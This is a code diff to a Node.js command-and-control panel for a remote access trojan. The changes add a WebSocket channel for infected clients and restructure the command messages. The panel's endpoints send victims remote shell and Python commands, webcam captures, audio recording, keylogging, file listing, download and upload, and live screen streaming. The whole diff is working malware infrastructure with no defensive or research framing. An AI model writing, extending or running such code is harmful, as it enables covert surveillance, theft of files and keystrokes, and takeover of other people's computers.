@@ -10,6 +10,7 @@ const fs = require('fs');
 const crypto = require('crypto');
 const net = require('net');
 const readline = require('readline');
+const WebSocket = require('ws');
 
 // Load environment variables
 require('dotenv').config();
@@ -38,6 +39,7 @@ class RATControlPanel {
         });
         
         this.ratServer = null;
+        this.wsServer = null;
         this.clients = new Map(); // client_id: {socket, address, authenticated, last_heartbeat, info}
         this.clientCounter = 0;
         this.running = true;
@@ -46,6 +48,7 @@ class RATControlPanel {
         this.setupRoutes();
         this.setupSocketIO();
         this.setupRATServer();
+        this.setupWebSocketServer();
         this.ensureDirectories();
         this.setupLogging();
     }
@@ -89,7 +92,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId or command' });
             }
             
-            const success = this.sendCommandToClient(clientId, { cmd: command });
+            const success = this.sendCommandToClient(clientId, { type: "command", data: { command } });
             res.json({ success, message: success ? 'Command sent' : 'Client not found or not authenticated' });
         });
 
@@ -99,7 +102,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId or code' });
             }
             
-            const success = this.sendCommandToClient(clientId, { python: code });
+            const success = this.sendCommandToClient(clientId, { type: "python", code });
             res.json({ success, message: success ? 'Python code sent' : 'Client not found or not authenticated' });
         });
 
@@ -109,7 +112,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId' });
             }
             
-            const success = this.sendCommandToClient(clientId, { webcam: true });
+            const success = this.sendCommandToClient(clientId, { type: "webcam" });
             res.json({ success, message: success ? 'Webcam capture requested' : 'Client not found or not authenticated' });
         });
 
@@ -119,7 +122,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId' });
             }
             
-            const success = this.sendCommandToClient(clientId, { audio: duration });
+            const success = this.sendCommandToClient(clientId, { type: "audio", duration });
             res.json({ success, message: success ? 'Audio recording requested' : 'Client not found or not authenticated' });
         });
 
@@ -129,7 +132,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId or action' });
             }
             
-            const success = this.sendCommandToClient(clientId, { keylog: action });
+            const success = this.sendCommandToClient(clientId, { type: "keylog", action });
             res.json({ success, message: success ? `Keylog ${action} requested` : 'Client not found or not authenticated' });
         });
 
@@ -139,7 +142,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId or path' });
             }
             
-            const success = this.sendCommandToClient(clientId, { file_list: path });
+            const success = this.sendCommandToClient(clientId, { type: "file_list", path });
             res.json({ success, message: success ? 'File list requested' : 'Client not found or not authenticated' });
         });
 
@@ -156,7 +159,7 @@ class RATControlPanel {
                 max_depth: max_depth || 10
             };
             
-            const success = this.sendCommandToClient(clientId, { list_files: options });
+            const success = this.sendCommandToClient(clientId, { type: "list_files", options });
             res.json({ success, message: success ? 'Advanced file list requested' : 'Client not found or not authenticated' });
         });
 
@@ -166,7 +169,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId or filepath' });
             }
             
-            const success = this.sendCommandToClient(clientId, { file_download: filepath });
+            const success = this.sendCommandToClient(clientId, { type: "file_download", filepath });
             res.json({ success, message: success ? 'File download requested' : 'Client not found or not authenticated' });
         });
 
@@ -176,7 +179,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId, filepath, or content' });
             }
             
-            const success = this.sendCommandToClient(clientId, { file_upload: { path: filepath, content } });
+            const success = this.sendCommandToClient(clientId, { type: "file_upload", file_data: { path: filepath, content } });
             res.json({ success, message: success ? 'File upload requested' : 'Client not found or not authenticated' });
         });
 
@@ -186,7 +189,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId' });
             }
             
-            const success = this.sendCommandToClient(clientId, { system_status: true });
+            const success = this.sendCommandToClient(clientId, { type: "system_status" });
             res.json({ success, message: success ? 'System status requested' : 'Client not found or not authenticated' });
         });
 
@@ -196,7 +199,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId' });
             }
             
-            const success = this.sendCommandToClient(clientId, { kill: true });
+            const success = this.sendCommandToClient(clientId, { type: "kill" });
             res.json({ success, message: success ? 'Kill command sent' : 'Client not found or not authenticated' });
         });
 
@@ -224,7 +227,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId' });
             }
             
-            const success = this.sendCommandToClient(clientId, { live_stream: { action: 'start', interval } });
+            const success = this.sendCommandToClient(clientId, { type: "live_stream", config: { action: 'start', interval } });
             res.json({ success, message: success ? 'Live stream started' : 'Client not found or not authenticated' });
         });
 
@@ -234,7 +237,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId' });
             }
             
-            const success = this.sendCommandToClient(clientId, { live_stream: { action: 'stop' } });
+            const success = this.sendCommandToClient(clientId, { type: "live_stream", config: { action: 'stop' } });
             res.json({ success, message: success ? 'Live stream stopped' : 'Client not found or not authenticated' });
         });
 
@@ -244,7 +247,7 @@ class RATControlPanel {
                 return res.status(400).json({ error: 'Missing clientId' });
             }
             
-            const success = this.sendCommandToClient(clientId, { test_capture: true });
+            const success = this.sendCommandToClient(clientId, { type: "test_capture" });
             res.json({ success, message: success ? 'Local capture test started' : 'Client not found or not authenticated' });
         });
 
@@ -272,7 +275,7 @@ class RATControlPanel {
 
             socket.on('send-command', (data) => {
                 const { clientId, command } = data;
-                const success = this.sendCommandToClient(clientId, { cmd: command });
+                const success = this.sendCommandToClient(clientId, { type: "command", data: { command } });
                 socket.emit('command-result', { success, clientId, command });
             });
 
@@ -297,6 +300,24 @@ class RATControlPanel {
             this.log('info', `RAT Server listening on ${SERVER_IP}:${SERVER_PORT}`);
             console.log(`[+] RAT Server listening on ${SERVER_IP}:${SERVER_PORT}`);
         });
+    }
+
+    setupWebSocketServer() {
+        // Create WebSocket server attached to the HTTP server
+        this.wsServer = new WebSocket.Server({ 
+            server: this.server,
+            path: '/ws'
+        });
+
+        this.wsServer.on('connection', (ws, req) => {
+            this.handleNewWebSocketConnection(ws, req);
+        });
+
+        this.wsServer.on('error', (error) => {
+            this.log('error', `WebSocket Server error: ${error.message}`);
+        });
+
+        console.log('[+] WebSocket Server setup complete');
     }
 
     ensureDirectories() {
@@ -355,6 +376,35 @@ class RATControlPanel {
         this.broadcastClientsUpdate();
     }
 
+    handleNewWebSocketConnection(ws, req) {
+        this.clientCounter++;
+        const clientId = `Client${this.clientCounter}`;
+        const clientAddr = req.socket.remoteAddress || 'unknown';
+        
+        console.log(`[+] New WebSocket connection from ${clientAddr}`);
+        this.log('info', `[${clientId}] WebSocket connected from ${clientAddr}`);
+        
+        this.clients.set(clientId, {
+            socket: ws,
+            address: clientAddr,
+            authenticated: false,
+            last_heartbeat: Date.now(),
+            info: {},
+            connectionType: 'websocket'
+        });
+        
+        if (REQUIRE_AUTH) {
+            this.handleWebSocketAuthentication(clientId, ws);
+        } else {
+            this.clients.get(clientId).authenticated = true;
+            ws.send(JSON.stringify({ status: "ok" }));
+            console.log(`[✓] ${clientId} authenticated.`);
+            this.handleWebSocketCommunication(clientId, ws);
+        }
+        
+        this.broadcastClientsUpdate();
+    }
+
     handleAuthentication(clientId, socket) {
         socket.once('data', (data) => {
             try {
@@ -375,6 +425,32 @@ class RATControlPanel {
             } catch (error) {
                 this.log('error', `[${clientId}] Authentication error: ${error.message}`);
                 socket.destroy();
+                this.clients.delete(clientId);
+            }
+        });
+    }
+
+    handleWebSocketAuthentication(clientId, ws) {
+        ws.once('message', (data) => {
+            try {
+                const message = JSON.parse(data.toString());
+                if (message.type === 'auth' && message.token === AUTH_TOKEN) {
+                    this.clients.get(clientId).authenticated = true;
+                    this.clients.get(clientId).info = message.client_info || {};
+                    ws.send(JSON.stringify({ status: "ok" }));
+                    console.log(`[✓] ${clientId} authenticated via WebSocket.`);
+                    this.broadcastClientsUpdate();
+                    
+                    // Start the main communication handler after authentication
+                    this.handleWebSocketCommunication(clientId, ws);
+                } else {
+                    ws.send(JSON.stringify({ status: "unauthorized" }));
+                    ws.close();
+                    this.clients.delete(clientId);
+                }
+            } catch (error) {
+                this.log('error', `[${clientId}] WebSocket Authentication error: ${error.message}`);
+                ws.close();
                 this.clients.delete(clientId);
             }
         });
@@ -419,6 +495,28 @@ class RATControlPanel {
         //     socket.destroy();
         //     this.removeClient(clientId);
         // });
+    }
+
+    handleWebSocketCommunication(clientId, ws) {
+        ws.on('message', (data) => {
+            try {
+                const message = JSON.parse(data.toString());
+                this.processClientMessage(clientId, message);
+            } catch (error) {
+                this.log('error', `[${clientId}] WebSocket message processing error: ${error.message}`);
+            }
+        });
+        
+        ws.on('error', (error) => {
+            this.log('error', `[${clientId}] WebSocket error: ${error.message}`);
+            this.removeClient(clientId);
+        });
+        
+        ws.on('close', () => {
+            console.log(`[-] ${clientId} WebSocket disconnected.`);
+            this.log('info', `[${clientId}] WebSocket disconnected`);
+            this.removeClient(clientId);
+        });
     }
 
     processClientMessage(clientId, message) {
@@ -709,7 +807,13 @@ class RATControlPanel {
         const clientInfo = this.clients.get(clientId);
         if (clientInfo) {
             try {
-                clientInfo.socket.destroy();
+                if (clientInfo.socket) { // Check if it's a socket.io socket or a ws socket
+                    if (clientInfo.socket.id) { // For socket.io
+                        this.io.sockets.sockets.get(clientInfo.socket.id).disconnect();
+                    } else if (clientInfo.socket.readyState === 'open') { // For ws
+                        clientInfo.socket.close();
+                    }
+                }
             } catch (error) {
                 // Ignore cleanup errors
             }
@@ -722,10 +826,21 @@ class RATControlPanel {
         try {
             const clientInfo = this.clients.get(clientId);
             if (clientInfo && clientInfo.authenticated) {
-                clientInfo.socket.write(JSON.stringify(commandDict));
+                if (clientInfo.connectionType === 'websocket') {
+                    // WebSocket connection
+                    if (clientInfo.socket.readyState === WebSocket.OPEN) {
+                        clientInfo.socket.send(JSON.stringify(commandDict));
+                    } else {
+                        console.log(`[!] WebSocket for ${clientId} is not open`);
+                        return false;
+                    }
+                } else {
+                    // TCP socket connection
+                    clientInfo.socket.write(JSON.stringify(commandDict));
+                }
                 
-                // Log the command being sent (handle both cmd property and direct command keys)
-                const commandName = commandDict.cmd || Object.keys(commandDict)[0];
+                // Log the command being sent
+                const commandName = commandDict.type || commandDict.cmd || Object.keys(commandDict)[0];
                 this.log('info', `[${clientId}] Command sent: ${commandName}`);
                 
                 return true;
@@ -765,7 +880,13 @@ class RATControlPanel {
         // Close all client connections
         for (const [clientId, clientInfo] of this.clients) {
             try {
-                clientInfo.socket.destroy();
+                if (clientInfo.socket) { // Check if it's a socket.io socket or a ws socket
+                    if (clientInfo.socket.id) { // For socket.io
+                        this.io.sockets.sockets.get(clientInfo.socket.id).disconnect();
+                    } else if (clientInfo.socket.readyState === 'open') { // For ws
+                        clientInfo.socket.close();
+                    }
+                }
             } catch (error) {
                 // Ignore errors during cleanup
             }
@@ -778,6 +899,9 @@ class RATControlPanel {
         }
         if (this.server) {
             this.server.close();
+        }
+        if (this.wsServer) { // Close WebSocket server
+            this.wsServer.close();
         }
         
         // Close log stream
